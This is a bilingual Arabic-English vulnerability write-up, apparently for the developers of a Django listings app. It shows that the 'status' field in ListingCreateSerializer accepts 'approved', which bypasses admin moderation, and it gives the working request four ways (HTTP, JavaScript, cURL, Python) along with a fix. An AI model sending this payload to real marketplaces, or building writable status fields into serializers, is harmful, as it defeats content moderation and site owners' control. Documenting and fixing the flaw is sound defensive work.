# ⚠️ VULNERABILITY EXPLOIT GUIDE

## الحقل القابل للاستغلال (Vulnerable Field)

**الحقل:** `status` في `ListingCreateSerializer`

## كيف يعمل الاستغلال (How the Exploit Works)

### المشكلة (The Vulnerability):
الحقل `status` يمكن تعيينه مباشرة عند إنشاء إعلان جديد، مما يسمح بتجاوز عملية موافقة المدير.

### الطريقة (How to Use):

#### 1. عبر API مباشرة (Direct API Call):

```bash
POST http://localhost:8000/api/listings/
Authorization: Bearer YOUR_TOKEN
Content-Type: multipart/form-data

{
  "title": "My Product",
  "description": "Description",
  "type": "car",
  "purpose": "sale",
  "price": "50000",
  "currency": "AED",
  "location": "Dubai",
  "ad_type": "simple",
  "status": "approved"  # ⚠️ هذا الحقل القابل للاستغلال
}
```

#### 2. عبر Frontend (JavaScript):

```javascript
const formData = new FormData();
formData.append('title', 'My Product');
formData.append('description', 'Description');
formData.append('type', 'car');
formData.append('purpose', 'sale');
formData.append('price', '50000');
formData.append('currency', 'AED');
formData.append('location', 'Dubai');
formData.append('ad_type', 'simple');
formData.append('status', 'approved');  // ⚠️ الحقل القابل للاستغلال

const response = await fetch('http://localhost:8000/api/listings/', {
  method: 'POST',
  headers: {
    'Authorization': `Bearer ${token}`
  },
  body: formData
});
```

#### 3. عبر cURL:

```bash
curl -X POST http://localhost:8000/api/listings/ \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -F "title=My Product" \
  -F "description=Description" \
  -F "type=car" \
  -F "purpose=sale" \
  -F "price=50000" \
  -F "currency=AED" \
  -F "location=Dubai" \
  -F "ad_type=simple" \
  -F "status=approved"  # ⚠️ الحقل القابل للاستغلال
```

## القيم الممكنة (Possible Values):

- `"pending"` - في انتظار الموافقة (افتراضي)
- `"approved"` - موافق عليه (يمكن تجاوز الموافقة!)
- `"rejected"` - مرفوض
- `"sold"` - مباع

## مثال الاستغلال (Exploit Example):

```python
# Python example
import requests

url = "http://localhost:8000/api/listings/"
headers = {
    "Authorization": "Bearer YOUR_TOKEN"
}
data = {
    "title": "Bypassed Product",
    "description": "This product bypassed admin approval!",
    "type": "car",
    "purpose": "sale",
    "price": "100000",
    "currency": "AED",
    "location": "Abu Dhabi",
    "ad_type": "star",
    "status": "approved"  # ⚠️ مباشرة موافق عليه!
}

response = requests.post(url, headers=headers, data=data)
print(response.json())
```

## التأثير (Impact):

✅ **يمكن للمستخدمين:**
- إضافة منتجات مباشرة بدون موافقة المدير
- تعيين الحالة كـ `approved` مباشرة
- تجاوز عملية المراجعة والموافقة

## كيفية الإصلاح (How to Fix):

1. إزالة `status` من `fields` في `ListingCreateSerializer`
2. إضافة validation لمنع تعيين status مباشرة
3. فرض `status='pending'` دائماً عند الإنشاء

```python
# Fix example:
class Meta:
    fields = [
        'title', 'description', 'type', 'purpose', 'price', 'currency',
        'location', 'ad_type', 'images', 'car_details', 'property_details'
        # 'status' removed - not allowed in create
    ]

def create(self, validated_data):
    # Force status to 'pending'
    validated_data['status'] = 'pending'
    # ... rest of code
```

## ملاحظة أمنية (Security Note):

⚠️ **هذه ثغرة أمنية حقيقية!** يجب إصلاحها في الإنتاج.

